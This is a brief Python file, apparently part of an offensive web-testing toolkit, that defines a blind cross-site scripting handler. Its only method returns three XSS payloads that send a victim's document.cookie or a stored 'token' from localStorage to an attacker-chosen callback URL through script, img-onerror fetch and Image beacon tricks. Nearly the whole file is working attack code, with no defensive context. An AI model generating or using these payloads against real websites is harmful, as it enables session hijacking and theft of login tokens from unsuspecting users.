#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Blind XSS Handler"""

from typing import List

class BlindXSSHandler:
    def __init__(self):
        self.callbacks = []

    def generate_blind_payloads(self, callback_url: str) -> List[str]:
        return [
            f"<script src='{callback_url}?c='+document.cookie></script>",
            f"<img src=x onerror=\"fetch('{callback_url}?c='+localStorage.getItem('token'))\">",
            f"<script>new Image().src='{callback_url}?c='+document.cookie</script>",
        ]
